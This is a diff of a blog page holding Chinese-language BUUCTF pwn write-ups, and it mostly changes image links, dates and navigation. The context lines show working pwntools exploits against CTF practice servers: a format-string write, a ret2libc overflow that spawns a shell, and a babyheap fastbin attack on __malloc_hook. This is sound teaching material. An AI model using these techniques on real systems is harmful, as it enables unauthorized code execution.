@@ -27,14 +27,14 @@
 <meta property="og:site_name" content="CoLin&#39;s Pwnhome">
 <meta property="og:description" content="重点讲解第26题：babyheap的解题方法。 buu017-not_the_same_3dsctf_20161234567891011from pwn import *# io &#x3D; process(&amp;#x27;.&#x2F;pwn&amp;#x27;)io &#x3D; remote(&amp;#x27;node4.buuoj.cn&amp;#x27;, 25850)elf &#x3D; ELF(&amp;#x27;.&#x2F;pwn&amp;#x27;)payload">
 <meta property="og:locale">
-<meta property="og:image" content="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/1.png">
-<meta property="og:image" content="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/2.png">
-<meta property="og:image" content="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/3.png">
-<meta property="article:published_time" content="2023-02-28T12:43:07.000Z">
-<meta property="article:modified_time" content="2023-02-28T12:45:07.323Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/819fff57a2e84971a375beb1be6ffc31.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0481579d7899474cbe33733f3aa828e4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b90efebb8ce54bd7ae8349c3569acd6f.png">
+<meta property="article:published_time" content="2023-02-28T14:27:13.000Z">
+<meta property="article:modified_time" content="2023-02-28T14:27:13.959Z">
 <meta property="article:author" content="CoLin">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/1.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/819fff57a2e84971a375beb1be6ffc31.png">
 
 <link rel="canonical" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/">
 
@@ -176,18 +176,8 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 20:43:07 / Modified: 20:45:07" itemprop="dateCreated datePublished" datetime="2023-02-28T20:43:07+08:00">2023-02-28</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buuctf-write-up-series/" itemprop="url" rel="index"><span itemprop="name">buuctf write-up series</span></a>
-                </span>
+              <time title="Created: 2023-02-28 22:27:13" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:13+08:00">2023-02-28</time>
             </span>
 
           
@@ -212,9 +202,9 @@
 <h1 id="buu024-jarvisoj-fm"><a href="#buu024-jarvisoj-fm" class="headerlink" title="buu024-jarvisoj_fm"></a>buu024-jarvisoj_fm</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29021</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(fmtstr_payload(<span class="number">11</span>, &#123;<span class="number">0x804A02C</span>: <span class="number">4</span>&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="buu025-pwn2-sctf-2016"><a href="#buu025-pwn2-sctf-2016" class="headerlink" title="buu025-pwn2_sctf_2016"></a>buu025-pwn2_sctf_2016</h1><p>这一题真是吃尽苦头，LibcSearcher不给力，找半天也没找到适合的libc（应该是libc6-i386_2.23_0ubuntu10_amd64，但是由于LibcSearcher连的是ubuntu官网，这个版本被删了，然后就找不到了。。。）。看着这道题没做出来实在是气，不过又看到了程序中有一个int 80，于是思考能不能用系统调用解决问题。发现很难，因为给的gadget都是inc，执行完vuln函数之后eax,ebx,edx都是很小的值，总不可能一个inc执行几十万次吧？<br>查看了下gadget，ebx,edi,esi,ebp倒是能直接控制，对于eax,ecx,edx还是要费很多心思。<br>后来给用pip装的LibcSearcher卸了换上<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">国人写的</a>就好了。果然还是国人给力o(￣▽￣)ｄ<br>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29855</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_anyaddr</span>(<span class="params">addr</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(addr))</span><br><span class="line">	content = io.recvuntil(<span class="string">b&#x27;How&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(4)</span></span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(sys) + p32(binsh) + p32(binsh))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu026-babyheap-0ctf-2017"><a href="#buu026-babyheap-0ctf-2017" class="headerlink" title="buu026-babyheap_0ctf_2017"></a>buu026-babyheap_0ctf_2017</h1><p>第一道堆题。<br><strong>解法：unsorted bin overlapping chunks + fastbin attack</strong><br>提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：<br><img src="/2023/02/28/buuctf-pwn-write-ups-2/1.png"><br>简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。<br>首先，这道题中<strong>对于内存的分配使用的是calloc而非malloc函数</strong>，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，<strong>本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度</strong>。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。<br><img src="/2023/02/28/buuctf-pwn-write-ups-2/2.png"></p>
+<h1 id="buu026-babyheap-0ctf-2017"><a href="#buu026-babyheap-0ctf-2017" class="headerlink" title="buu026-babyheap_0ctf_2017"></a>buu026-babyheap_0ctf_2017</h1><p>第一道堆题。<br><strong>解法：unsorted bin overlapping chunks + fastbin attack</strong><br>提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：<br><img src="https://img-blog.csdnimg.cn/819fff57a2e84971a375beb1be6ffc31.png"><br>简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。<br>首先，这道题中<strong>对于内存的分配使用的是calloc而非malloc函数</strong>，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，<strong>本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度</strong>。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。<br><img src="https://img-blog.csdnimg.cn/0481579d7899474cbe33733f3aa828e4.png"></p>
 <p>获取到了这里的地址，我们就可以获取到system函数和__free_hook的地址。本题环境为2.23，无tcache的影响，有通过fastbin attack修改__malloc_hook的可行性。</p>
-<p>这是一开始__malloc_hook附近的情况：<br><img src="/2023/02/28/buuctf-pwn-write-ups-2/3.png"><br>要想在__malloc_hook附近分配chunk，首先需要通过检查：</p>
+<p>这是一开始__malloc_hook附近的情况：<br><img src="https://img-blog.csdnimg.cn/b90efebb8ce54bd7ae8349c3569acd6f.png"><br>要想在__malloc_hook附近分配chunk，首先需要通过检查：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 <p>下面是fastbin_index的宏定义：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>
@@ -285,12 +275,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/02/28/buuctf-pwn-write-ups-1/" rel="prev" title="buuctf-pwn write-ups (1)">
-      <i class="fa fa-chevron-left"></i> buuctf-pwn write-ups (1)
+    <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/" rel="prev" title="ARM pwn 入门 (1)">
+      <i class="fa fa-chevron-left"></i> ARM pwn 入门 (1)
     </a></div>
       <div class="post-nav-item">
-    <a href="/2023/02/28/buuctf-pwn-write-ups-3/" rel="next" title="buuctf-pwn write-ups (3)">
-      buuctf-pwn write-ups (3) <i class="fa fa-chevron-right"></i>
+    <a href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/" rel="next" title="Kernel Pwn 入门 (2)">
+      Kernel Pwn 入门 (2) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -364,13 +354,9 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">81</span>
           <span class="site-state-item-name">posts</span>
         </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">categories</span>
       </div>
   </nav>
 </div>
@@ -451,6 +437,8 @@
 
 
 
+
+  
 
   
 
